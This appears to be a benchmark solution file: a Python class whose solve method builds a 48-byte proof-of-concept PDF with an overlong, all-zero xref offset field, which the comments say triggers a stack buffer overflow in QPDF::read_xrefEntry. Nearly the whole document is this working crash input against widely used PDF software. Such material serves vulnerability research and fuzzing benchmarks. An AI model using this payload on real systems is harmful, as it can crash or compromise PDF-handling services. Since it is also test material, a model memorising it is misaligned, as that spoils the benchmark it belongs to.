class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a stack buffer overflow in QPDF::read_xrefEntry.
        # It is triggered by an overlong field 1 (offset) or field 2 (generation) in the xref table,
        # specifically when consisting only of zeros and lacking proper end-of-line validation.
        # Ground truth length is 48 bytes.
        
        # Structure:
        # 1. PDF Header: "%PDF-1.0\n" (9 bytes)
        # 2. Xref tag: "xref\n" (5 bytes)
        # 3. Subsection header: "0 1\n" (4 bytes) - indicating 1 entry starting at object 0
        # 4. Malformed Entry: Overlong f1 field. 
        #    Normal max is 10 digits. We provide 28 zeros followed by " f".
        #    "0" * 28 + " f" = 30 bytes.
        
        # Total length: 9 + 5 + 4 + 30 = 48 bytes.
        
        poc = b"%PDF-1.0\nxref\n0 1\n" + b"0" * 28 + b" f"
        return poc
